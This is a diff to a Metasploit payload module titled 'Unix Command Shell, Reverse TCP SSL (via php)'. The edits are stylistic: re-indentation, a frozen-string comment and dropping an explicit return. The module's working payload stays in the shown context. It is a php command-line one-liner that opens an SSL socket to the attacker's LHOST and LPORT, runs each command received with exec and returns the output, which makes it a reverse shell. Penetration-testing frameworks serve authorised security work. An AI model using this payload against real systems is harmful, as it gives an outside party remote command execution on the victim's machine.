@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 132
 
   include Msf::Payload::Single
@@ -17,22 +17,21 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP SSL (via php)',
-      'Description'   => 'Creates an interactive shell via php, uses SSL',
-      'Author'        => 'RageLtMan',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcpSsl,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'php',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+                     'Name'          => 'Unix Command Shell, Reverse TCP SSL (via php)',
+                     'Description'   => 'Creates an interactive shell via php, uses SSL',
+                     'Author'        => 'RageLtMan',
+                     'License'       => BSD_LICENSE,
+                     'Platform'      => 'unix',
+                     'Arch'          => ARCH_CMD,
+                     'Handler'       => Msf::Handler::ReverseTcpSsl,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'PayloadType'   => 'cmd',
+                     'RequiredCmd'   => 'php',
+                     'Payload'       =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       }))
   end
 
   #
@@ -40,7 +39,7 @@ module MetasploitModule
   #
   def generate
     vprint_good(command_string)
-    return super + command_string
+    super + command_string
   end
 
   #
@@ -52,5 +51,4 @@ module MetasploitModule
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
     cmd = "php -r '$s=fsockopen(\"ssl://#{datastore['LHOST']}\",#{datastore['LPORT']});while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}'&"
   end
-
 end
